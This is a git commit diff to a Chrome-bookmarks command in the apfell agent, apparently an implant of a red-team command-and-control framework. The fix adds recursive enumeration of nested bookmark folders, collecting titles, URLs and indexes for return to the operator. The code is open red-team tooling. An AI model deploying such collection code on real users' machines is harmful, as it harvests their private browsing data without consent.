2c3a6410cd2f15f42093cd3ee04aa075410696ba
Arsenii <arsenii@local>
2021-04-03 23:15:27 -0400

    Chrome bookmarks - nested bookmarks directories fix

--- Payload_Types/apfell/agent_code/chrome_bookmarks.js
+++ Payload_Types/apfell/agent_code/chrome_bookmarks.js
@@ -6,15 +6,8 @@ exports.chrome_bookmarks = function(task, command, params){
             let folders = ch.bookmarkFolders;
             for (let i = 0; i < folders.length; i ++){
                 let folder = folders[i];
-                let bookmarks = folder.bookmarkItems;
-                all_data.push("Folder Name: " + folder.title());
-                for (let j = 0; j < bookmarks.length; j++){
-                    let info = "Title: " + bookmarks[j].title() +
-                    "\nURL: " + bookmarks[j].url() +
-                    "\nindex: " + bookmarks[j].index() +
-                    "\nFolder/bookmark: " + i + "/" + j;
-                    all_data.push(info); //populate our array
-                }
+                // we are using the fact that JS passes arrays by reference here to pass a reference to all_data
+                chrome_bookmarks_enum_folder(folder, all_data);
             }
         }
         else{
@@ -28,4 +21,34 @@ exports.chrome_bookmarks = function(task, command, params){
 		return {"user_output":err, "completed": true, "status": "error"};
 	}
 	return {"user_output": all_data, "completed": true};
+};
+
+let chrome_bookmarks_enum_folder = function(folder, all_data, folderPath = ""){
+
+    // for each folder under our current bookmark folder - call chrome_bookmarks_enum_folder
+    for (let i = 0; i < folder.bookmarkFolders.length; i++){
+        chrome_bookmarks_enum_folder(folder.bookmarkFolders[i], all_data, folderPath + folder.title() + "/");
+    }
+
+    // once we are done with folders, let's work on the bookmarkd items
+    chrome_bookmarks_enum_itmes(folder, all_data, folderPath);
+
+};
+
+let chrome_bookmarks_enum_itmes = function(folder, all_data, folderPath){
+    let bookmarks = folder.bookmarkItems;
+    
+    all_data.push("Folder Name: " + folderPath + folder.title());
+    
+    for (let j = 0; j < bookmarks.length; j++){
+        
+        let info = "Title: " + bookmarks[j].title() +
+        "\nURL: " + bookmarks[j].url() +
+        "\nindex: " + bookmarks[j].index() +
+        // note i'm using folder.index() here since each folder has a unique index within each parent container
+        // this will result in multiple folders with the same index if they are members of different folders
+        "\nFolder/bookmark: " + folder.index() + "/" + j;
+        all_data.push(info); //populate our array
+    }
+
 };
